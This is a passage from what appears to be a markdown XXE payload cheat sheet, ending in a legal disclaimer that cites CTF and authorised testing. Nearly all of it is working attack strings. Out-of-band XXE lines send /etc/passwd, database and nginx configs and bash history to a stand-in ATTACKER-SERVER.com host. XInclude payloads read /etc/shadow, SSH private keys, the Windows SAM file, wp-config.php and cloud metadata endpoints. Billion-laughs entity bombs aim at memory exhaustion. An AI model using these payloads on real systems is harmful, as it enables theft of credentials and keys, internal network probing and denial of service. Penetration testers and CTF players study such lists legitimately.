<!DOCTYPE data [<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER-SERVER.com/?data=exfil'>">%all;%send;]>
<!DOCTYPE foo [<!ENTITY % base "http://ATTACKER-SERVER.com"><!ENTITY % xxe SYSTEM "%base;/evil.dtd">%xxe;]>
<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/mysql/my.cnf"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER-SERVER.com/mysql?c=%file;'>">%eval;%exfil;]>
<!DOCTYPE data [<!ENTITY % remote SYSTEM "http://ATTACKER-SERVER.com/remote.dtd">%remote;%payload;%exfil;]>
<!DOCTYPE foo [<!ENTITY % param "<!ENTITY &#x26; internal 'http://127.0.0.1'>">%param;]>

<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///var/www/html/index.php"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/php.dtd">%dtd;%grab;]>
<!DOCTYPE data [<!ENTITY % nested "<!ENTITY &#x25; file SYSTEM 'file:///etc/passwd'><!ENTITY &#x25; eval '<!ENTITY &#x26; exfil SYSTEM \"http://ATTACKER-SERVER.com/?%file;\">'>">%nested;%eval;]>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "ftp://ATTACKER-SERVER.com/xxe.dtd">%xxe;]>
<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/nginx/nginx.conf"><!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER-SERVER.com/nginx?conf=%file;'>">%eval;%send;]>
<!DOCTYPE data [<!ENTITY % param1 SYSTEM "http://ATTACKER-SERVER.com/1.dtd"><!ENTITY % param2 SYSTEM "http://ATTACKER-SERVER.com/2.dtd">%param1;%param2;]>
<!DOCTYPE foo [<!ENTITY % wrapper "<!ENTITY &#x26; file SYSTEM 'file:///etc/passwd'>">%wrapper;]>
<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///root/.bash_history"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/history.dtd">%dtd;%exfil;]>
```

## 5. XXE LFI access Payloads
```html
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/shadow"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hosts"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/issue"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///proc/version"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///proc/self/environ"/></foo>

<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///var/log/apache2/access.log"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///var/www/html/index.php"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///var/www/html/config.php"/></foo>
<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></data>
<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/shadow"/></root>
<test xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///c:/windows/win.ini"/></test>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///c:/boot.ini"/></foo>

<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///c:/windows/system32/drivers/etc/hosts"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///c:/inetpub/wwwroot/web.config"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///root/.ssh/id_rsa"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///root/.bash_history"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/user/.ssh/id_rsa"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/user/.bash_history"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="php://filter/convert.base64-encode/resource=/etc/passwd"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="php://filter/convert.base64-encode/resource=index.php"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="php://filter/convert.base64-encode/resource=config.php"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://127.0.0.1:80"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://localhost/admin"/></foo>

<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://metadata.google.internal/computeMetadata/v1/"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://ATTACKER-SERVER.com"/></foo>
<userInfo xmlns:xi="http://www.w3.org/2001/XInclude"><firstName>John</firstName><lastName><xi:include parse="text" href="file:///etc/passwd"/></lastName></userInfo>
<order xmlns:xi="http://www.w3.org/2001/XInclude"><item><xi:include parse="text" href="file:///etc/shadow"/></item></order>
<product xmlns:xi="http://www.w3.org/2001/XInclude"><name><xi:include parse="text" href="file:///etc/hosts"/></name></product>
<request xmlns:xi="http://www.w3.org/2001/XInclude"><data><xi:include parse="text" href="file:///etc/passwd"/></data></request>
<message xmlns:xi="http://www.w3.org/2001/XInclude"><body><xi:include parse="text" href="file:///var/www/html/config.php"/></body></message>
<comment xmlns:xi="http://www.w3.org/2001/XInclude"><text><xi:include parse="text" href="file:///etc/hostname"/></text></comment>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="xml" href="file:///etc/passwd"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></foo>

<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///usr/local/apache2/conf/httpd.conf"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/apache2/apache2.conf"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/nginx/nginx.conf"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/mysql/my.cnf"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///var/www/html/.htaccess"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///var/www/html/wp-config.php"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/php.ini"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/environment"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///proc/self/cmdline"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///proc/cpuinfo"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///c:/windows/system32/config/sam"/></foo>
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///c:/windows/system32/config/system"/></foo>
```

## 6. XXE Bomb Payloads
```html
<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>
<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "1234567890" ><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;"><!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;"><!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;"><!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;"><!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;"><!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;">]><bomb>&i;</bomb>
<?xml version="1.0"?><!DOCTYPE kaboom [<!ENTITY a "aaaaaaaaaaaaaaaaaa"><!ENTITY a1 "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;"><!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;"><!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">]><kaboom>&a4;</kaboom>
<!DOCTYPE data [<!ENTITY a0 "dos" ><!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;"><!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;"><!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;"><!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;">]><data>&a4;</data>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY ha "Ha !"><!ENTITY ha2 "&ha; &ha;"><!ENTITY ha3 "&ha2; &ha2;"><!ENTITY ha4 "&ha3; &ha3;"><!ENTITY ha5 "&ha4; &ha4;">]><root>&ha5;</root>
<!DOCTYPE dos [<!ELEMENT dos ANY><!ENTITY dos "dos"><!ENTITY dos2 "&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;"><!ENTITY dos3 "&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;">]><dos>&dos3;</dos>

<?xml version="1.0"?><!DOCTYPE dos [<!ENTITY x0 "x"><!ENTITY x1 "&x0;&x0;"><!ENTITY x2 "&x1;&x1;"><!ENTITY x3 "&x2;&x2;"><!ENTITY x4 "&x3;&x3;"><!ENTITY x5 "&x4;&x4;"><!ENTITY x6 "&x5;&x5;"><!ENTITY x7 "&x6;&x6;"><!ENTITY x8 "&x7;&x7;">]><dos>&x8;</dos>
<!DOCTYPE billion [<!ELEMENT billion ANY><!ENTITY laugh0 "ha"><!ENTITY laugh1 "&laugh0;&laugh0;"><!ENTITY laugh2 "&laugh1;&laugh1;"><!ENTITY laugh3 "&laugh2;&laugh2;"><!ENTITY laugh4 "&laugh3;&laugh3;"><!ENTITY laugh5 "&laugh4;&laugh4;"><!ENTITY laugh6 "&laugh5;&laugh5;"><!ENTITY laugh7 "&laugh6;&laugh6;"><!ENTITY laugh8 "&laugh7;&laugh7;"><!ENTITY laugh9 "&laugh8;&laugh8;"><!ENTITY laugh10 "&laugh9;&laugh9;">]><billion>&laugh10;</billion>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % zero "0123456789"><!ENTITY % one "&zero;&zero;&zero;&zero;&zero;&zero;&zero;&zero;&zero;&zero;"><!ENTITY % two "&one;&one;&one;&one;&one;&one;&one;&one;&one;&one;"><!ENTITY % three "&two;&two;&two;&two;&two;&two;&two;&two;&two;&two;">]><root>&three;</root>
<!DOCTYPE data [<!ENTITY expand "AAAAAAAAAAAAAAAAAAAA"><!ENTITY expand1 "&expand;&expand;&expand;&expand;"><!ENTITY expand2 "&expand1;&expand1;&expand1;&expand1;"><!ENTITY expand3 "&expand2;&expand2;&expand2;&expand2;"><!ENTITY expand4 "&expand3;&expand3;&expand3;&expand3;">]><data>&expand4;</data>
<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><bomb>&c;</bomb>
<!DOCTYPE root [<!ENTITY test "test"><!ENTITY test1 "&test;&test;&test;&test;&test;&test;&test;&test;&test;&test;&test;&test;&test;&test;&test;&test;"><!ENTITY test2 "&test1;&test1;&test1;&test1;&test1;&test1;&test1;&test1;&test1;&test1;&test1;&test1;&test1;&test1;&test1;&test1;">]><root>&test2;</root>
<!DOCTYPE megabomb [<!ENTITY a "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">]><megabomb>&d;</megabomb>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY bar "World "><!ENTITY bar1 "&bar;&bar;&bar;&bar;&bar;"><!ENTITY bar2 "&bar1;&bar1;&bar1;&bar1;&bar1;"><!ENTITY bar3 "&bar2;&bar2;&bar2;&bar2;&bar2;"><!ENTITY bar4 "&bar3;&bar3;&bar3;&bar3;&bar3;"><!ENTITY bar5 "&bar4;&bar4;&bar4;&bar4;&bar4;">]><foo>Hello &bar5;</foo>
<!DOCTYPE bomb [<!ENTITY z "bomb"><!ENTITY z1 "&z;&z;&z;&z;&z;&z;&z;&z;&z;&z;&z;&z;&z;&z;&z;&z;&z;&z;&z;&z;"><!ENTITY z2 "&z1;&z1;&z1;&z1;&z1;&z1;&z1;&z1;&z1;&z1;&z1;&z1;&z1;&z1;&z1;&z1;&z1;&z1;&z1;&z1;"><!ENTITY z3 "&z2;&z2;&z2;&z2;&z2;&z2;&z2;&z2;&z2;&z2;&z2;&z2;&z2;&z2;&z2;&z2;&z2;&z2;&z2;&z2;">]><bomb>&z3;</bomb>

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY payload "0123456789"><!ENTITY payload1 "&payload;&payload;&payload;&payload;&payload;&payload;&payload;&payload;&payload;&payload;"><!ENTITY payload2 "&payload1;&payload1;&payload1;&payload1;&payload1;&payload1;&payload1;&payload1;&payload1;&payload1;"><!ENTITY payload3 "&payload2;&payload2;&payload2;&payload2;&payload2;&payload2;&payload2;&payload2;&payload2;&payload2;"><!ENTITY payload4 "&payload3;&payload3;&payload3;&payload3;&payload3;&payload3;&payload3;&payload3;&payload3;&payload3;">]><root>&payload4;</root>
<!DOCTYPE gigabomb [<!ENTITY laughs "hahaha"><!ENTITY l1 "&laughs;&laughs;&laughs;&laughs;&laughs;&laughs;&laughs;&laughs;"><!ENTITY l2 "&l1;&l1;&l1;&l1;&l1;&l1;&l1;&l1;"><!ENTITY l3 "&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;"><!ENTITY l4 "&l3;&l3;&l3;&l3;&l3;&l3;&l3;&l3;"><!ENTITY l5 "&l4;&l4;&l4;&l4;&l4;&l4;&l4;&l4;">]><gigabomb>&l5;</gigabomb>
<?xml version="1.0"?><!DOCTYPE data [<!ENTITY base "BASE"><!ENTITY lvl1 "&base;&base;&base;&base;&base;&base;&base;&base;&base;&base;&base;&base;&base;&base;&base;&base;"><!ENTITY lvl2 "&lvl1;&lvl1;&lvl1;&lvl1;&lvl1;&lvl1;&lvl1;&lvl1;&lvl1;&lvl1;&lvl1;&lvl1;&lvl1;&lvl1;&lvl1;&lvl1;"><!ENTITY lvl3 "&lvl2;&lvl2;&lvl2;&lvl2;&lvl2;&lvl2;&lvl2;&lvl2;&lvl2;&lvl2;&lvl2;&lvl2;&lvl2;&lvl2;&lvl2;&lvl2;">]><data>&lvl3;</data>
<!DOCTYPE recursion [<!ENTITY ent "Recursion"><!ENTITY ent1 "&ent;&ent;&ent;&ent;&ent;&ent;&ent;&ent;&ent;&ent;"><!ENTITY ent2 "&ent1;&ent1;&ent1;&ent1;&ent1;&ent1;&ent1;&ent1;&ent1;&ent1;"><!ENTITY ent3 "&ent2;&ent2;&ent2;&ent2;&ent2;&ent2;&ent2;&ent2;&ent2;&ent2;"><!ENTITY ent4 "&ent3;&ent3;&ent3;&ent3;&ent3;&ent3;&ent3;&ent3;&ent3;&ent3;"><!ENTITY ent5 "&ent4;&ent4;&ent4;&ent4;&ent4;&ent4;&ent4;&ent4;&ent4;&ent4;">]><recursion>&ent5;</recursion>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY expand "EXPAND"><!ENTITY expand0 "&expand;&expand;&expand;&expand;&expand;&expand;&expand;&expand;&expand;&expand;&expand;&expand;&expand;&expand;&expand;&expand;&expand;&expand;&expand;&expand;"><!ENTITY expand1 "&expand0;&expand0;&expand0;&expand0;&expand0;&expand0;&expand0;&expand0;&expand0;&expand0;&expand0;&expand0;&expand0;&expand0;&expand0;&expand0;&expand0;&expand0;&expand0;&expand0;"><!ENTITY expand2 "&expand1;&expand1;&expand1;&expand1;&expand1;&expand1;&expand1;&expand1;&expand1;&expand1;&expand1;&expand1;&expand1;&expand1;&expand1;&expand1;&expand1;&expand1;&expand1;&expand1;">]><foo>&expand2;</foo>
<!DOCTYPE attack [<!ENTITY mem "Memory"><!ENTITY mem1 "&mem;&mem;&mem;&mem;&mem;&mem;&mem;&mem;"><!ENTITY mem2 "&mem1;&mem1;&mem1;&mem1;&mem1;&mem1;&mem1;&mem1;"><!ENTITY mem3 "&mem2;&mem2;&mem2;&mem2;&mem2;&mem2;&mem2;&mem2;"><!ENTITY mem4 "&mem3;&mem3;&mem3;&mem3;&mem3;&mem3;&mem3;&mem3;"><!ENTITY mem5 "&mem4;&mem4;&mem4;&mem4;&mem4;&mem4;&mem4;&mem4;"><!ENTITY mem6 "&mem5;&mem5;&mem5;&mem5;&mem5;&mem5;&mem5;&mem5;">]><attack>&mem6;</attack>
<?xml version="1.0"?><!DOCTYPE exploit [<!ENTITY e "EXPLOIT"><!ENTITY e1 "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;"><!ENTITY e2 "&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;"><!ENTITY e3 "&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;"><!ENTITY e4 "&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;">]><exploit>&e4;</exploit>
```



---
<div align="center">

### Legal Disclaimer

**Maintained & Curated by 5kullk3r**

*This material is maintained and curated for authorized Capture The Flag (CTF) challenges, educational & ethical purposes, and legal security auditing with explicit permission.*

*Some content may have been collected or adapted from publicly available resources and/or third-party sources. No claim of original authorship or ownership is made over such material unless explicitly stated. Credit and attribution belong to the respective original authors or sources where applicable.*

<sub>Unauthorized system access is illegal. **5kullk3r** does not claim ownership of third-party content and disclaims all liability for any misuse or damages.</sub>

</div>
